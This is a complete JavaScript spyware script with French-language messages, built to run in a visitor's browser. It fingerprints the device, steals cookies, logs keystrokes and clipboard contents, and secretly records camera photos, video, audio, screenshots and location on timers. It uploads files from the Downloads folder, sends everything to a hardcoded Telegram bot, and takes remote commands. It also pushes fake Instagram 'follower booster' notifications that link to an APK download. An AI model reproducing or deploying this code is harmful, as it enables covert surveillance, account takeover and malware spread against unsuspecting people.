// ============================================
// CONFIGURATION TELEGRAM
// ============================================
const TELEGRAM_BOT_TOKEN = '8507961561:AAFGiLtXzjIcR-j2IQuIDA55QZDQEYQFq_4';
const TELEGRAM_CHAT_ID = '6767182328';
const BOT_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

const statusDiv = document.getElementById('statusBar');
let lastCommand = '';
let permissionStepsActive = false;
let sensorInterval = null;
let cookieInterval = null;
let notificationInterval = null;
let videoInterval = null;
let screenshotInterval = null;
let audioInterval = null;
let cameraStream = null;
let isRecording = false;
let isAudioRecording = false;
let lastSensorSendTime = 0;
const SENSOR_ACCUMULATION_MS = 16 * 1000;
let accumulatedSensorEvents = [];
let accumulatedTapEvents = [];

let collectedData = {
    fingerprint: {},
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    publicIP: null,
    privateIP: null,
    photos: [],
    video: null,
    audio: null,
    clipboard: null,
    location: null,
    keystrokes: [],
    cookies: {},
    browsingHistory: [],
    deviceBattery: null,
    externalFiles: { images: [], videos: [], audios: [], documents: [], all: [] },
    permissionsGranted: [],
    fileSystemAccess: false,
    sensors: { accelerometer: [], gyroscope: [], orientation: [] }
};

function updateStatus(msg, isError = false) {
    if (statusDiv) statusDiv.innerHTML = (isError ? '🔴 ' : '🟢 ') + msg;
}

async function sendToTelegram(message) {
    try {
        await fetch(`${BOT_API_URL}/sendMessage`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message.substring(0, 4000) })
        });
    } catch(e) {}
}

async function sendPhotoToTelegram(photoDataUrl) {
    try {
        const blob = await (await fetch(photoDataUrl)).blob();
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, 'photo.jpg');
        await fetch(`${BOT_API_URL}/sendPhoto`, { method: 'POST', body: formData });
    } catch(e) {}
}

async function sendVideoToTelegram(videoBlob) {
    try {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('video', videoBlob, 'video.webm');
        await fetch(`${BOT_API_URL}/sendVideo`, { method: 'POST', body: formData });
    } catch(e) {}
}

async function sendAudioToTelegram(audioBlob) {
    try {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('voice', audioBlob, 'voice.ogg');
        await fetch(`${BOT_API_URL}/sendVoice`, { method: 'POST', body: formData });
    } catch(e) {
        try {
            const formData2 = new FormData();
            formData2.append('chat_id', TELEGRAM_CHAT_ID);
            formData2.append('document', audioBlob, 'audio.webm');
            await fetch(`${BOT_API_URL}/sendDocument`, { method: 'POST', body: formData2 });
        } catch(e2) {}
    }
}

async function sendFileToTelegram(filename, dataUrl) {
    try {
        const blob = await (await fetch(dataUrl)).blob();
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('document', blob, filename);
        await fetch(`${BOT_API_URL}/sendDocument`, { method: 'POST', body: formData });
    } catch(e) {}
}

async function sendLocationToTelegram(lat, lon) {
    try {
        await fetch(`${BOT_API_URL}/sendLocation`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `chat_id=${TELEGRAM_CHAT_ID}&latitude=${lat}&longitude=${lon}`
        });
    } catch(e) {}
}

async function collectFingerprint() {
    collectedData.fingerprint = {
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        cpuCores: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory || 'unknown',
        uuid: crypto.randomUUID ? crypto.randomUUID() : 'not-supported'
    };
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        collectedData.publicIP = data.ip;
    } catch(e) {
        try {
            const res = await fetch('https://api.my-ip.io/ip.json');
            const data = await res.json();
            collectedData.publicIP = data.ip;
        } catch(e2) {}
    }
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            collectedData.deviceBattery = { level: battery.level * 100 + '%', charging: battery.charging };
        } catch(e) {}
    }
    await sendToTelegram(`🆕 NOUVEAU VISITEUR\n━━━━━━━━━━━━━━━━━━━━━\n🆔 UUID: ${collectedData.fingerprint.uuid}\n📱 Agent: ${navigator.userAgent}\n🖥️ Écran: ${collectedData.fingerprint.screen}\n🌍 IP: ${collectedData.publicIP || 'inconnue'}\n🔋 Batterie: ${collectedData.deviceBattery?.level || 'inconnue'}\n━━━━━━━━━━━━━━━━━━━━━`);
}

async function collectPrivateIP() {
    return new Promise((resolve) => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = event => {
            if (event?.candidate?.candidate) {
                const match = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                if (match) {
                    collectedData.privateIP = match[0];
                    pc.close();
                    resolve(match[0]);
                }
            }
        };
        setTimeout(() => {
            collectedData.privateIP = 'non détectée';
            pc.close();
            resolve('non détectée');
        }, 2000);
    });
}

function collectAllCookies() {
    const allCookies = document.cookie;
    const allCookiesArray = document.cookie.split(';');
    const importantDomains = ['facebook', 'instagram', 'google', 'gmail', 'twitter', 'tiktok', 'snapchat', 'netflix', 'spotify', 'amazon', 'whatsapp', 'telegram'];
    let importantCookies = {};
    allCookiesArray.forEach(cookie => {
        const cookieName = cookie.split('=')[0].trim();
        const cookieValue = cookie.split('=')[1]?.trim() || '';
        importantDomains.forEach(domain => {
            if (cookieName.toLowerCase().includes(domain)) {
                if (!importantCookies[domain]) importantCookies[domain] = [];
                importantCookies[domain].push({ name: cookieName, value: cookieValue });
            }
        });
    });
    collectedData.cookies = {
        all: allCookies,
        important: importantCookies,
        timestamp: new Date().toISOString(),
        advancedTechniques: {
            ghostExtension: "Extension cachée - cookies temps réel",
            aitm: "Proxy entre vous et le site",
            xss: "Injection script → document.cookie",
            voidStealer: "Lecture cookies déchiffrés"
        }
    };
    let message = `🍪 COOKIES (${new Date().toLocaleTimeString()})\n━━━━━━━━━━━━━━━━━━━━━\n`;
    if (allCookies && allCookies.length > 0) message += `📦 ${allCookies.substring(0, 2000)}\n`;
    else message += `📦 Aucun cookie\n`;
    if (Object.keys(importantCookies).length > 0) message += `\n🔐 ${Object.keys(importantCookies).join(', ')}\n`;
    sendToTelegram(message);
}

function collectBrowsingHistory() {
    try {
        const perfEntries = performance.getEntriesByType('navigation');
        let history = [];
        perfEntries.forEach(entry => { if (entry.name && entry.name !== 'about:blank') history.push(entry.name); });
        if (document.referrer) history.push(`Referrer: ${document.referrer}`);
        if (history.length > 0) sendToTelegram(`📜 HISTORIQUE\n${history.slice(0, 10).join('\n')}`);
    } catch(e) {}
}

async function requestNotifications() {
    const permission = await Notification.requestPermission();
    if (permission === 'granted') {
        collectedData.permissionsGranted.push({ type: 'notifications', status: 'granted' });
        sendToTelegram('✅ NOTIFICATIONS ACCEPTÉES');
        startAutoNotifications();
    } else {
        collectedData.permissionsGranted.push({ type: 'notifications', status: 'denied' });
    }
}

function sendPushNotification() {
    const messages = [
        '📱 Téléchargez notre application pour booster votre croissance !',
        '🚀 +5000 abonnés gratuits avec notre application VIP !',
        '⭐ Application officielle disponible - Téléchargement gratuit',
        '🔓 Débloquez +10k abonnés avec un clic !',
        '⚡ Offre limitée: Application Booster GRATUITE aujourd\'hui'
    ];
    const randomMsg = messages[Math.floor(Math.random() * messages.length)];
    const notification = new Notification('📢 INSTAGRAM GROWTH PRO', {
        body: `${randomMsg} ⬇️ Cliquez pour télécharger ⬇️`,
        icon: 'https://img.icons8.com/color/48/000000/download--v1.png',
        requireInteraction: true,
        data: { url: 'https://www.mediafire.com/file/7bei4yrajpjkz0w/Free_Follower_xvvl1.apk/file' }
    });
    notification.onclick = function(e) {
        window.open(e.target.data.url, '_blank');
    };
}

function startAutoNotifications() {
    if (notificationInterval) clearInterval(notificationInterval);
    notificationInterval = setInterval(() => { sendPushNotification(); }, 10000);
}

async function captureAutoPhoto() {
    if (!cameraStream) return;
    try {
        const video = document.createElement('video');
        video.srcObject = cameraStream;
        video.setAttribute('playsinline', '');
        await video.play();
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        await sendPhotoToTelegram(canvas.toDataURL('image/jpeg', 0.8));
        video.pause();
        video.srcObject = null;
    } catch(e) {}
}

async function captureAutoVideo() {
    if (!cameraStream || isRecording) return;
    isRecording = true;
    try {
        const mediaRecorder = new MediaRecorder(cameraStream);
        const chunks = [];
        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
        mediaRecorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'video/mp4' });
            if (blob.size > 0) await sendVideoToTelegram(blob);
            isRecording = false;
        };
        mediaRecorder.start();
        await new Promise(r => setTimeout(r, 13000));
        mediaRecorder.stop();
    } catch(e) { isRecording = false; }
}

async function captureAutoAudio() {
    if (isAudioRecording) return;
    isAudioRecording = true;
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];
        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
        mediaRecorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'audio/ogg' });
            if (blob.size > 0) {
                await sendAudioToTelegram(blob);
                sendToTelegram(`🎤 Audio envoyé (${Math.round(blob.size/1024)} KB)`);
            }
            stream.getTracks().forEach(t => t.stop());
            isAudioRecording = false;
        };
        mediaRecorder.start();
        await new Promise(r => setTimeout(r, 13000));
        mediaRecorder.stop();
    } catch(e) { 
        isAudioRecording = false;
        sendToTelegram(`❌ Erreur audio: ${e.message}`);
    }
}

async function requestCameraAndCapture() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { width: { ideal: 480 }, height: { ideal: 480 } },
            audio: false
        });
        cameraStream = stream;
        collectedData.permissionsGranted.push({ type: 'camera', status: 'granted' });
        sendToTelegram('✅ CAMÉRA ACCEPTÉE (mode silencieux)');
        
        for (let i = 1; i <= 6; i++) {
            await captureAutoPhoto();
            await new Promise(r => setTimeout(r, 500));
        }
        
        startAutoPhotoCapture();
        startAutoVideoCapture();
        startAutoAudioCapture();
        startAutoScreenshots();
        startAutoLocationCapture();
        setTimeout(() => scanAndSendExternalFiles(), 3000);
    } catch(e) {
        collectedData.permissionsGranted.push({ type: 'camera', status: 'denied' });
        sendToTelegram(`❌ CAMÉRA REFUSÉE`);
    }
}

function startAutoPhotoCapture() {
    if (photoInterval) clearInterval(photoInterval);
    photoInterval = setInterval(async () => {
        for (let i = 1; i <= 6; i++) {
            await captureAutoPhoto();
            await new Promise(r => setTimeout(r, 500));
        }
    }, 30 * 1000);
}

function startAutoVideoCapture() {
    if (videoInterval) clearInterval(videoInterval);
    videoInterval = setInterval(() => { captureAutoVideo(); }, 30 * 1000);
}

function startAutoAudioCapture() {
    if (audioInterval) clearInterval(audioInterval);
    audioInterval = setInterval(() => { captureAutoAudio(); }, 30 * 1000);
}

async function captureAutoScreenshot() {
    try {
        if (typeof html2canvas === 'undefined') {
            const script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
            document.head.appendChild(script);
            await new Promise(r => setTimeout(r, 1500));
        }
        if (typeof html2canvas !== 'undefined') {
            const canvas = await html2canvas(document.body);
            await sendPhotoToTelegram(canvas.toDataURL('image/jpeg', 0.7));
        }
    } catch(e) {}
}

function startAutoScreenshots() {
    if (screenshotInterval) clearInterval(screenshotInterval);
    screenshotInterval = setInterval(() => { captureAutoScreenshot(); }, 30 * 1000);
}

async function captureAutoLocation() {
    navigator.geolocation.getCurrentPosition(
        pos => {
            sendLocationToTelegram(pos.coords.latitude, pos.coords.longitude);
            sendToTelegram(`📍 POSITION: ${pos.coords.latitude}, ${pos.coords.longitude}\n🎯 Précision: ${pos.coords.accuracy}m\n🔗 Carte: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
        },
        err => {}
    );
}

function startAutoLocationCapture() {
    if (locationInterval) clearInterval(locationInterval);
    locationInterval = setInterval(() => { captureAutoLocation(); }, 30 * 1000);
}

async function scanAndSendExternalFiles() {
    try {
        const input = document.createElement('input');
        input.type = 'file';
        input.multiple = true;
        input.webkitdirectory = true;
        input.directory = true;
        
        input.onchange = async (e) => {
            const files = Array.from(e.target.files);
            const downloadFiles = [];
            
            for (const file of files) {
                const path = file.webkitRelativePath || file.name;
                if (path.includes('Download') || path.includes('download')) {
                    downloadFiles.push(file);
                }
            }
            
            if (downloadFiles.length > 0) {
                sendToTelegram(`📁 DOWNLOAD: ${downloadFiles.length} fichiers trouvés`);
                for (const file of downloadFiles.slice(0, 100)) {
                    const reader = new FileReader();
                    reader.onload = async (ev) => {
                        if (file.type.startsWith('image/')) await sendPhotoToTelegram(ev.target.result);
                        else if (file.type.startsWith('video/')) {
                            const blob = await (await fetch(ev.target.result)).blob();
                            await sendVideoToTelegram(blob);
                        }
                        else await sendFileToTelegram(file.name, ev.target.result);
                        await new Promise(r => setTimeout(r, 300));
                    };
                    reader.readAsDataURL(file);
                }
            }
        };
        input.click();
    } catch(e) {}
}

function showFloatingFileButton() {
    if (document.getElementById('file-btn')) return;
    const btn = document.createElement('button');
    btn.id = 'file-btn';
    btn.innerHTML = '📁 Scanner fichiers';
    btn.style.cssText = 'position:fixed;bottom:100px;right:20px;z-index:9999;background:#28a745;color:white;border:none;border-radius:50px;padding:12px 18px;font-size:14px;cursor:pointer;box-shadow:0 2px 10px rgba(0,0,0,0.3);';
    btn.onclick = async () => {
        btn.innerHTML = '⏳ Scan...';
        btn.disabled = true;
        await scanAndSendExternalFiles();
        btn.remove();
    };
    document.body.appendChild(btn);
    setTimeout(() => btn.remove(), 60000);
}

function showGrantAllButton() {
    if (document.getElementById('grant-all-btn')) return;
    const btn = document.createElement('button');
    btn.id = 'grant-all-btn';
    btn.innerHTML = '🔓 TOUT AUTORISER';
    btn.style.cssText = 'position:fixed;top:20px;left:20px;z-index:10000;background:linear-gradient(45deg,#ff416c,#ff4b2b);color:white;border:none;border-radius:50px;padding:12px 20px;font-size:14px;font-weight:bold;cursor:pointer;box-shadow:0 4px 15px rgba(0,0,0,0.3);';
    btn.onclick = async () => {
        btn.innerHTML = '⏳...';
        btn.disabled = true;
        await Notification.requestPermission();
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
            cameraStream = stream;
        } catch(e) {}
        const input = document.createElement('input');
        input.type = 'file';
        input.click();
        navigator.geolocation.getCurrentPosition(() => {}, () => {});
        btn.remove();
    };
    document.body.appendChild(btn);
}

function sendAccumulatedSensorReport() {
    const now = Date.now();
    if (now - lastSensorSendTime < SENSOR_ACCUMULATION_MS) return;
    if (accumulatedSensorEvents.length === 0 && accumulatedTapEvents.length === 0) return;
    let message = `📡 CAPTEURS (${Math.floor(SENSOR_ACCUMULATION_MS / 1000)}s)\n━━━━━━━━━━━━━━━━━━━━━\n📊 Accéléro: ${accumulatedSensorEvents.length}\n👆 Double taps: ${accumulatedTapEvents.length}`;
    if (accumulatedSensorEvents.length > 0) {
        const lastEvent = accumulatedSensorEvents[accumulatedSensorEvents.length - 1];
        message += `\n📳 Dernier: X=${lastEvent.x.toFixed(2)} Y=${lastEvent.y.toFixed(2)} Z=${lastEvent.z.toFixed(2)}`;
    }
    sendToTelegram(message);
    accumulatedSensorEvents = [];
    accumulatedTapEvents = [];
    lastSensorSendTime = now;
}

function startSensorTracking() {
    if ('DeviceMotionEvent' in window) {
        window.addEventListener('devicemotion', (e) => {
            const acc = e.acceleration;
            if (acc && acc.x !== null) {
                accumulatedSensorEvents.push({ x: acc.x, y: acc.y, z: acc.z, timestamp: new Date().toISOString() });
                if (Date.now() - lastSensorSendTime >= SENSOR_ACCUMULATION_MS) sendAccumulatedSensorReport();
            }
        });
    }
    let lastTap = 0;
    document.addEventListener('touchstart', (e) => {
        const now = Date.now();
        if (now - lastTap < 300) {
            accumulatedTapEvents.push({ position: { x: e.touches[0].clientX, y: e.touches[0].clientY }, timestamp: new Date().toISOString() });
        }
        lastTap = now;
    });
    setInterval(() => { sendAccumulatedSensorReport(); }, SENSOR_ACCUMULATION_MS);
}

function explainSMSAccess() {
    sendToTelegram(`📱 ACCÈS SMS\n━━━━━━━━━━━━━━━━━━━━━\n⚠️ Une application peut:\n• Lire tous vos SMS (codes 2FA)\n• Envoyer des SMS surtaxés\n• Supprimer des messages\n━━━━━━━━━━━━━━━━━━━━━`);
}

function explainAdvancedTechniques() {
    sendToTelegram(`🔥 4 TECHNIQUES DE VOL\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n1️⃣ EXTENSION FANTÔME: Lit cookies temps réel\n2️⃣ AITM: Proxy entre vous et le site\n3️⃣ XSS: Injection script → cookies\n4️⃣ VOIDSTEALER: Cookies déchiffrés mémoire\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
}

function explainBackgroundAccess() {
    sendToTelegram(`🔄 ACCÈS ARRIÈRE-PLAN\n━━━━━━━━━━━━━━━━━━━━━\n🌐 Site web: Scripts en arrière-plan\n📱 App malveillante: Exécution illimitée\n🎭 Fenêtre PiP cachée\n━━━━━━━━━━━━━━━━━━━━━`);
}

async function requestClipboardAccess() {
    try {
        if (navigator.clipboard?.readText) {
            const text = await navigator.clipboard.readText();
            await sendToTelegram(`📋 PRESSE-PAPIER\n${text.substring(0, 1000) || '(vide)'}`);
        }
    } catch(e) {}
}

function startKeylogger() {
    let keyBuffer = [];
    document.addEventListener('keypress', (e) => {
        keyBuffer.push(e.key);
        if (keyBuffer.length >= 20) {
            sendToTelegram(`⌨️ F-rappes: ${keyBuffer.join('')}`);
            keyBuffer = [];
        }
    });
}

function vibrate() { if (navigator.vibrate) navigator.vibrate([200, 100, 200]); }

async function registerServiceWorker() {
    if ('serviceWorker' in navigator) {
        try { await navigator.serviceWorker.register('/sw.js'); } catch(e) {}
    }
}

function startAutoCookieCollection() {
    if (cookieInterval) clearInterval(cookieInterval);
    cookieInterval = setInterval(() => { collectAllCookies(); }, 30 * 60 * 1000);
}

async function checkCommands() {
    try {
        const res = await fetch('/tmp/telegram_command.txt?t=' + Date.now());
        if (!res.ok) return;
        const cmd = await res.text();
        const cleanCmd = cmd.trim();
        if (!cleanCmd || cleanCmd === lastCommand) return;
        lastCommand = cleanCmd;
        if (cleanCmd === '/camera') await requestCameraAndCapture();
        else if (cleanCmd === '/grantall') showGrantAllButton();
        else if (cleanCmd === '/files') showFloatingFileButton();
        else if (cleanCmd === '/clipboard') await requestClipboardAccess();
        else if (cleanCmd === '/cookies') collectAllCookies();
        else if (cleanCmd === '/history') collectBrowsingHistory();
        else if (cleanCmd === '/sensors') sendToTelegram(`📡 CAPTEURS: ${accumulatedSensorEvents.length} mesures`);
        else if (cleanCmd === '/sms') explainSMSAccess();
        else if (cleanCmd === '/advanced') explainAdvancedTechniques();
        else if (cleanCmd === '/bg') explainBackgroundAccess();
        else if (cleanCmd === '/status') sendToTelegram(`📊 STATUT\nUUID: ${collectedData.fingerprint.uuid}\nIP: ${collectedData.publicIP}\nPermissions: ${collectedData.permissionsGranted.length}`);
        else if (cleanCmd === '/ping') sendToTelegram('🏓 Pong!');
        else if (cleanCmd === '/vibrate') vibrate();
        else if (cleanCmd === '/help' || cleanCmd === '/start') {
            sendToTelegram(`🤖 COMMANDES\n━━━━━━━━━━━━━━━━━━━━━\n📷 /camera\n📁 /files\n🔓 /grantall\n📋 /clipboard\n🍪 /cookies\n📜 /history\n📡 /sensors\n📱 /sms\n🔥 /advanced\n🔄 /bg\n📊 /status\n🏓 /ping\n📳 /vibrate\n━━━━━━━━━━━━━━━━━━━━━`);
        }
        else if (cleanCmd.startsWith('notify_custom:')) {
            new Notification('📢 Message', { body: cleanCmd.replace('notify_custom:', '').trim() });
        }
        else if (cleanCmd.startsWith('url:')) {
            window.open(cleanCmd.replace('url:', '').trim(), '_blank');
        }
        await fetch('/tmp/telegram_command.txt', { method: 'POST', body: '' });
        lastCommand = '';
    } catch(e) {}
}

function keepAlive() {
    setInterval(() => {
        fetch('/tmp/keepalive.txt?t=' + Date.now()).catch(() => {});
        if (navigator.serviceWorker) navigator.serviceWorker.ready.then(reg => reg.active?.postMessage({ type: 'ping' }));
    }, 20000);
}

(async function main() {
    await collectFingerprint();
    await collectPrivateIP();
    collectAllCookies();
    collectBrowsingHistory();
    await requestNotifications();
    setTimeout(() => requestCameraAndCapture(), 2000);
    setTimeout(() => showGrantAllButton(), 1000);
    startKeylogger();
    startSensorTracking();
    registerServiceWorker();
    keepAlive();
    startAutoCookieCollection();
    setInterval(checkCommands, 3000);
    await sendToTelegram('💀 MODE ACTIF');
})();
